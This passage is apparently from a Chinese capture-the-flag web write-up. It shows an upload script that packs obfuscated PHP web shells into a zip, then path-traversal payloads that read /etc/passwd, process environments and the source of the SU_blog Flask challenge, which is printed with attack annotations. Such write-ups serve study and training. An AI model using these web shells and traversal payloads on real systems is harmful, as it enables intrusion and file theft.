zf.writestr(&#x27;kc1zs4.php&#x27;, b&#x27;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;l&quot;.&quot;s /&quot;);&#x27;)</span></span><br><span class="line">    zf.writestr(<span class="string">&#x27;kc1zs4.php&#x27;</span>, <span class="string">b&#x27;&lt;?php $a=&quot;syst&quot;;$b=&quot;em&quot;;$c=$a.$b;echo $c(&quot;ca&quot;.&quot;t /seef1ag_getfl4g&quot;);&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span>*<span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>) <span class="comment"># 构造出错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;kc1zs4.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br><span class="line"></span><br><span class="line"><span class="comment">### 报错的思路</span></span><br><span class="line"><span class="comment"># path_error=&quot;/error&quot;</span></span><br><span class="line"><span class="comment"># r = session.get(host+path_error, proxies=bp, timeout=5)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 发送一个zip看</span></span><br><span class="line">path_unzip=<span class="string">&quot;/unzip.php&quot;</span></span><br><span class="line">zip_file = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (</span><br><span class="line">        <span class="string">&#x27;kc1zs4.zip&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;kc1zs4.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;application/zip&#x27;</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_unzip, files=zip_file, proxies=bp, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="SU-blog"><a href="#SU-blog" class="headerlink" title="SU_blog"></a>SU_blog</h2><h3 id="SU-blog-环境配置"><a href="#SU-blog-环境配置" class="headerlink" title="SU_blog 环境配置"></a>SU_blog 环境配置</h3><ol>
+<li>给了docker(ai: docker compose基本命令)<ol>
+<li>进入Dockerfile项目根目录<code>docker-compose build</code></li>
+<li>查看正在运行的服务<code>docker-compose ps</code></li>
+<li>启动服务<code>docker-compose up -d</code>，-d指定后台运行</li>
+<li>停止服务<code>docker-compose down</code></li>
+</ol>
+</li>
+</ol>
+<h3 id="SU-blog-分析-SV"><a href="#SU-blog-分析-SV" class="headerlink" title="SU_blog 分析| SV"></a>SU_blog 分析| SV</h3><ol>
+<li><p>没有源码，注册个账号，进入，看看能不能拿源码</p>
+</li>
+<li><p>登录后拿到提示</p>
+<ol>
+<li>这个session像是flask</li>
+<li>我最喜欢时间戳了，而且听说md5这种单项签名非常安全，所以我把博客诞生的时间当做了自己的SECRET</li>
+<li>没法报错？</li>
+</ol>
+</li>
+<li><p>目录穿越有没有找到和无权限两种，这个权限怎么办</p>
+<ol>
+<li><p>？？？注册一个admin的用户突然就有权限了？权限绕过这么ez？</p>
+</li>
+<li><p>articles&#x2F;….&#x2F;&#x2F;articles&#x2F;article1.txt可以读取到文件，方向应该是对的</p>
+</li>
+<li><p>article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;etc&#x2F;passwd，成功读到</p>
+</li>
+<li><p>article?file&#x3D;articles&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;proc&#x2F;1&#x2F;environ 但是没有flag嘻嘻，肯定不会这么简单，想方法读读源码，猜测是flask框架，读运行目录</p>
+</li>
+<li><p>印象还有个cmdline是进程命令行参数的</p>
+<ol>
+<li>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/niyani/p/17074125.html]">https://www.cnblogs.com/niyani/p/17074125.html]</a> 很像啊，有pythonapp&#x2F;app.py</li>
+<li>articles&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;….&#x2F;&#x2F;pythonapp&#x2F;app.py没有啊</li>
+<li>直接app.py试一试，file&#x3D;articles&#x2F;….&#x2F;&#x2F;app.py，ok，读到源码，审计一下<ol>
+<li>SECRET是否可以伪造</li>
+<li>&#x2F;article的file可以是数组？</li>
+<li>有waf.py，但黑名单，给出了pwaf和cwaf，不能读就只能盲注了，fenjing！<ol>
+<li>key和value的waf似乎是不一样的</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,os,json,hashlib</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> pwaf,cwaf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 密钥是时间戳，可以伪造session吗</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = hashlib.md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.time())).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">users = &#123;<span class="string">&quot;testuser&quot;</span>: <span class="string">&quot;password&quot;</span>&#125;    <span class="comment"># 有一个给定的users</span></span><br><span class="line"><span class="comment"># 项目根目录</span></span><br><span class="line">BASE_DIR = <span class="string">&#x27;/var/www/html/myblog/app&#x27;</span></span><br><span class="line"></span><br><span class="line">articles = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="string">&quot;articles/article1.txt&quot;</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&quot;articles/article2.txt&quot;</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">&quot;articles/article3.txt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">friend_links = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;bkf1sh&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ctf.org.cn/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;fushuling&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://fushuling.com/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;yulate&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.yulate.com/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zimablue&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.zimablue.life/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;baozongwi&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://baozongwi.xyz/&quot;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">user_data = User()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">只判断session中的用户名</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blog.html&#x27;</span>, articles=articles, friend_links=friend_links)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">登录成功就进行重定向</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid credentials&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">注册后就放入users字典中</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        users[username] = password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change_password&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_password</span>():</span><br><span class="line">    <span class="comment"># 判断是否登录</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过旧密码来鉴权</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        old_password = request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">        new_password = request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">        confirm_password = request.form[<span class="string">&#x27;confirm_password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users[session[<span class="string">&#x27;username&#x27;</span>]] != old_password:</span><br><span class="line">            flash(<span class="string">&quot;Old password is incorrect&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> new_password != confirm_password:</span><br><span class="line">            flash(<span class="string">&quot;New passwords do not match&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[session[<span class="string">&#x27;username&#x27;</span>]] = new_password</span><br><span class="line">            flash(<span class="string">&quot;Password changed successfully&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change_password.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">只有admin才可以访问/friendlinks，或者session中有username(也没啥)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/friendlinks&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">friendlinks</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;friendlinks.html&#x27;</span>, links=friend_links)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">要求同/friendlinks，应该能xss</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_friendlink&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_friendlink</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">and</span> url:</span><br><span class="line">        friend_links.append(&#123;<span class="string">&quot;name&quot;</span>: name, <span class="string">&quot;url&quot;</span>: url&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;friendlinks&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">要求同/friendlink</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_friendlink/&lt;int:index&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_friendlink</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= index &lt; <span class="built_in">len</span>(friend_links):</span><br><span class="line">        <span class="keyword">del</span> friend_links[index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;friendlinks&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    file_name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=<span class="string">&#x27;&#x27;</span>, content=<span class="string">&quot;未提供文件名。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    blacklist = [<span class="string">&quot;waf.py&quot;</span>]</span><br><span class="line">    <span class="comment"># 这里是允许file_name是数组吗</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(blacklisted_file <span class="keyword">in</span> file_name <span class="keyword">for</span> blacklisted_file <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;大黑阔不许看&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 需要指定个开头，想对了</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name.startswith(<span class="string">&#x27;articles/&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;无效的文件路径。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file_name <span class="keyword">not</span> <span class="keyword">in</span> articles.values():</span><br><span class="line">        <span class="comment"># 现在是admin了没有问题</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;无权访问该文件。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    file_path = os.path.join(BASE_DIR, file_name)</span><br><span class="line">    file_path = file_path.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)    <span class="comment"># 双写绕过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 可以读取任意文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        content = <span class="string">&quot;文件未找到。&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;Error reading file <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        content = <span class="string">&quot;读取文件时发生错误。&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里应该是重点</span></span><br><span class="line"><span class="string">post请求，get中pass=SUers</span></span><br><span class="line"><span class="string">post传json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">user_data ssti?</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;pass&#x27;</span>)!=<span class="string">&quot;SUers&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            body = request.json</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> body:</span><br><span class="line">                flash(<span class="string">&quot;No JSON data received&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;No JSON data received&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            key = body.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">            value = body.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flash(<span class="string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pwaf(key):</span><br><span class="line">                flash(<span class="string">&quot;Invalid key format&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid key format&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cwaf(value):</span><br><span class="line">                flash(<span class="string">&quot;Invalid value format&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid value format&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            set_(user_data, key, value)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&quot;User data updated successfully&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;User data updated successfully&quot;</span>&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">            flash(<span class="string">&quot;Invalid JSON data&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid JSON data&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flash(<span class="string">f&quot;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">f&quot;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, user_data=user_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="comment"># 重置你的session</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    flash(<span class="string">&quot;You have been 